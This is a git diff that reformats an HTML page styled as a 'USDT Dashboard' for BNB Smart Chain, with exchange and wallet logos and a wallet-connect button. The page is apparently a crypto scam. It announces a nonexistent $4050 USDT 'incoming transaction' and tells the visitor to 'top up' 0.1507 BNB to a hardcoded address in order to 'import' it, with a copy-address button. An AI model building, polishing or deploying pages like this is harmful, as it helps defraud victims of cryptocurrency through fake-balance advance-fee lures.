@@ -1,8 +1,9 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT-BNB Smart Chain</title>
+  <title>USDT Dashboard - BNB Smart Chain</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
   <style>
     body {
@@ -62,7 +63,11 @@
     }
   </style>
 </head>
-<body>  <h1>BNB Smart Chain USDT</h1>  <div class="logos">
+<body>
+
+  <h1>BNB Smart Chain USDT Dashboard</h1>
+
+  <div class="logos">
     <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance" />
     <img src="https://cryptologos.cc/logos/bitget-bgb-logo.png" alt="Bitget" />
     <img src="https://cryptologos.cc/logos/bybit-logo.png" alt="Bybit" />
@@ -70,22 +75,33 @@
     <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png" alt="Coinbase" />
     <img src="https://cryptologos.cc/logos/metamask-logo.png" alt="MetaMask" />
     <img src="https://walletconnect.com/walletconnect-logo.svg" alt="WalletConnect" />
-  </div>  <div class="card">
+  </div>
+
+  <div class="card">
     <p><strong>Connected Wallet Address:</strong></p>
-    <div class="address-box" id="walletAddress">Not connected</div><div class="stat">
-  <h3 id="usdtBalance">$0.00</h3>
-  <p>Your USDT Balance (BEP-20)</p>
-</div>
+    <div class="address-box" id="walletAddress">Not connected</div>
 
-<button class="btn-yellow" onclick="connectAndImport()">Connect Wallet & Import USDT</button>
+    <div class="stat">
+      <h3 id="usdtBalance">$0.00</h3>
+      <p>Your USDT Balance (BEP-20)</p>
+    </div>
 
-  </div>  <div class="card">
+    <button class="btn-yellow" onclick="connectAndImport()">Connect Wallet & Import USDT</button>
+  </div>
+
+  <div class="card">
     <h3>Confirm Incoming Transaction</h3>
     <p>Not Enough BNB to Import: <strong>$4050 USDT</strong></p>
     <p>Top up <strong>0.1507 BNB</strong> to your BSC address:</p>
     <div class="address-box" id="bscAddress">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
     <button class="btn-yellow" onclick="copyAddress()">Copy Address</button>
-  </div>  <!-- WalletConnect + Web3 -->  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>  <script>
+  </div>
+
+  <!-- WalletConnect + Web3 -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+
+  <script>
     const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
     const usdtABI = [
       {
@@ -139,5 +155,7 @@
         alert("Address copied to clipboard!");
       });
     }
-  </script></body>
+  </script>
+
+</body>
 </html>
